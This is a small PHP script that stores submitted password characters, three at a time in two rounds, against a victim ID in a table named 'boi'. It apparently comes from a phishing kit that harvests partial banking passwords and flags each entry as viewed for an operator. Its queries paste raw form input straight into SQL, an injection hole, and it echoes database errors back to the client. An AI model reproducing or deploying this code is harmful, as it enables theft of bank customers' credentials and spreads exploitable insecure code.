<?php
require '../connection.php';

if ($_POST["ask_pass_1"] and $_POST["ask_pass_2"] and $_POST["ask_pass_3"] and $_POST["uniqueid"]) {
  $ask_pass_1 = $_POST["ask_pass_1"];
  $ask_pass_2 = $_POST["ask_pass_2"];
  $ask_pass_3 = $_POST["ask_pass_3"];

  // First we check if first 3 password digits have been taken
  $uniqueid = $_POST["uniqueid"];
  $char_check = mysqli_query($conn, "SELECT ask_pass_1 FROM boi WHERE uniqueid=$uniqueid");
  if ($char_check) {
    $array = mysqli_fetch_array($char_check);

    $char1 = $array[0];
    if ($char1 == "") {
      $upload_security_question = mysqli_query($conn, "UPDATE boi SET ask_pass_1='$ask_pass_1', ask_pass_2='$ask_pass_2', ask_pass_3='$ask_pass_3', status=1, viewed='true' WHERE uniqueid=$uniqueid");
    } else {
      $upload_security_question = mysqli_query($conn, "UPDATE boi SET ask_pass_4='$ask_pass_1', ask_pass_5='$ask_pass_2', ask_pass_6='$ask_pass_3', status=1, viewed='true' WHERE uniqueid=$uniqueid");
    }
  }

  if ($upload_security_question) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
